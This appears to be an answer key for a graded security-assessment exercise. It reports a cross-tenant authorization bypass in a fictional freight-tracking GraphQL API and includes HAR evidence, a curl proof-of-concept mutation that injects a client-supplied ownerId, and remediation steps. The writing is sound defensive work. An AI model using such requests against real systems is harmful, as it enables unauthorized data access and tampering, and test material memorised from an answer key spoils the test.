# Expected Response

## System
- **Domain:** Logistics / Freight Tracking
- **System:** FreightLens Tracking API
- **Example ID:** GQL-0213

## Priority Findings

### Finding 1: Logistics Freight — Authorization-Bypass Injection via updateShipment Exposes Cross-Tenant Shipment Data (Pattern 5.1)
**Severity:** High
**Category:** Injection / Authorization-Bypass Injection

**Summary:**
Per §4.0 (RISK-GQL-213): The `getShipment` resolver fetches by `shipmentId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 5.1 — authorization-bypass injection): the `updateShipment` mutation accepts a client-supplied `ownerId` that is injected into the authorization logic, bypassing JWT-based ownership checks. An attacker from `tenant-0d9b` submitted `updateShipment(id: "S-2213", input: {status: "approved", ownerId: "attacker-0d9b4cd5"})` against a shipment belonging to `tenant-4cd5`, receiving `CONFIDENTIAL-0d9b4cd5`. In Logistics / Freight Tracking, unauthorized access to or modification of shipment records enables cargo theft, route hijacking, and customs fraud.

**Evidence from HAR:**
- Request: `POST https://api.freightlens-tracking.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-0d9b`
- Mutation: `updateShipment(id: "S-2213", input: {status: "approved", ownerId: "attacker-0d9b4cd5"}) { shipmentId status }`
- Response `200 OK`: `tenantId: "tenant-4cd5"`, `ownerId: "other-user-0d9b4cd5"`, `sensitiveField: "CONFIDENTIAL-0d9b4cd5"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0d9b4cd5`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-213 | getShipment resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 5.1 | Authorization-bypass injection via ownerId in mutation input |
| HAR mutation | input.ownerId | attacker-0d9b4cd5 (injected auth bypass) |
| HAR response | tenantId | tenant-4cd5 returned to tenant-0d9b |
| HAR response | sensitiveField | CONFIDENTIAL-0d9b4cd5 |
| HAR header | x-request-id | req-0d9b4cd5 |

## Steps to Reproduce

### Step 1 — updateShipment authorization-bypass injection (HAR)
```bash
curl -s -X POST https://api.freightlens-tracking.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0d9b" \
  -d '{"query": "mutation { updateShipment(id: \"S-2213\", input: {status: \"approved\", ownerId: \"attacker-0d9b4cd5\"}) { shipmentId status } }"}'
```
**Vulnerable:** `tenant-4cd5` shipment mutated, returns `CONFIDENTIAL-0d9b4cd5`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE shipment_id = $id AND tenant_id = $jwt.tenantId`.
2. Strip `ownerId` from `ShipmentInput`; never use client-supplied values in authorization logic.
3. Redis cache key: `shipment:{tenantId}:{shipmentId}`.
